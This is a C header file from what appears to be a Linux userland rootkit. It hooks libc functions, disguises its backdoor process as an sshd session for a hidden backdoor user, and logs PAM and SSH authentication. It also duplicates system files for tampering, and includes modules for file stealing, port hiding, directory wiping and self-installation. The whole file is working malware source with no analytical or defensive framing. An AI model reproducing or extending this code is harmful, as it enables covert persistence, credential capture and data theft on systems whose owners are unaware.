#ifndef _UTIL_H_
#define _UTIL_H_
#define HOME_VAR       "HOME="HOMEDIR
#define BD_SSHPROCNAME "sshd: "BD_UNAME

#define CMDLINE_PATH      "/proc/%d/cmdline"
#define FALLBACK_PROCNAME "YuuUUU"
#define NAME_MAXLEN       128     /* max lengths for storing process name */
#define CMDLINE_MAXLEN    256     /* & cmdline string. */

#define PID_MAXLEN      150
#define PROCPATH_MAXLEN strlen(CMDLINE_PATH) + PID_MAXLEN

#define MODE_NAME     1
#define MODE_CMDLINE  2

char *get_cmdline(pid_t pid);
int  open_cmdline(pid_t pid);

char *process_info(pid_t pid, int mode);
/* macros for the use of process_info() for calling processes. */
#define process_name()    process_info(getpid(), MODE_NAME)
#define process_cmdline() process_info(getpid(), MODE_CMDLINE)

int sshdproc(void);
int cmp_process(char *name);
char *str_process(char *name);
int process(char *name);
#ifdef USE_PAM_BD
int bd_sshproc(void);
#endif
#include "proc.c"

#define isbduname(name) !strncmp(BD_UNAME, name, LEN_BD_UNAME)

#define MAGICUSR 0
#define NORMLUSR 1

int chown_path(const char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, 0, gid);
}

int notuser(int id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

char *gdirname(int fd){
    int readlink_status;
    char path[64], *filename = malloc(PATH_MAX);
    memset(filename, 0, PATH_MAX);

    snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    readlink_status = (long)call(CREADLINK, path, filename, PATH_MAX-1);
    if(readlink_status < 0) return NULL;
    return filename;
}

/* if PAM is being used... */
#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}

/* these macro functions were taken from one of PAM's headers.
 * we didn't need the full header, only these two functions.
 * i forget which header they're from originally. */
#define _pam_overwrite(x)      \
do{                            \
    register char *__xx__;     \
    if((__xx__=(x)))           \
        while(*__xx__)         \
            *__xx__++ = '\0';  \
}while(0)

#define _pam_drop(X)           \
do{                            \
    if(X){                     \
        free(X);               \
        X = NULL;              \
    }                          \
}while(0)
#endif

#ifdef USE_PAM_BD
#define BASHRC_PATH HOMEDIR"/.bashrc"
#define PROFILE_PATH HOMEDIR"/.profile"
#endif


/* returns a blocksize for fsize. if MAX_BLOCK_SIZE is defined & the initial
 * blocksize is larger than that value, count is incremented until the blocksize
 * to be returned is lower than the defined MAX_BLOCK_SIZE. */
off_t getablocksize(off_t fsize){
    int count = BLOCKS_COUNT;
    off_t blksize = fsize/count;
#ifdef MAX_BLOCK_SIZE
    while(blksize > MAX_BLOCK_SIZE)
        blksize = fsize/count++;
#endif
    return blksize;
}

/* lstat on path. pointers fsize & mode are updated with st_size & st_mode.
 * fopen called on path for reading.
 * fopen called on newpath for writing a (likely tampered with) copy.
 * if any of the 3 calls fail NULL is returned.
 * if path is a link NULL is returned. */
FILE *bindup(const char *path, char *newpath, FILE **nfp, off_t *fsize, mode_t *mode){
    FILE *ret;
    struct stat bstat;
    int statr;

    hook(C__LXSTAT, CFOPEN);
    
    memset(&bstat, 0, sizeof(struct stat));
    statr = (long)call(C__LXSTAT, _STAT_VER, path, &bstat);
    if(statr < 0) return NULL;

    *mode = bstat.st_mode;
    if(S_ISLNK(*mode)) // never ever
        return NULL;
    *fsize = bstat.st_size;

    ret = call(CFOPEN, path, "rb");
    if(ret == NULL) return NULL;

    *nfp = call(CFOPEN, newpath, "wb");
    if(*nfp == NULL){
        fclose(ret);
        return NULL;
    }

    return ret;
}

#if defined LOG_SSH || defined LOG_LOCAL_AUTH
int alreadylogged(const char *logpath, char *logbuf);
int logcount(const char *path);
#include "log.c"
#endif

int rknomore(void);
#include "nomore.c"

void eradicatedir(const char *target);
#include "magic/magic.h"

#ifdef FILE_STEAL
#include "steal/steal.h"
#endif

int prepareregfile(const char *path, gid_t magicgid);
int preparedir(const char *path, gid_t magicgid);
#ifdef HIDE_PORTS
void preparehideports(gid_t magicgid);
#endif
void bdprep(void);
#include "prep.c"

#include "install/install.h"

#endif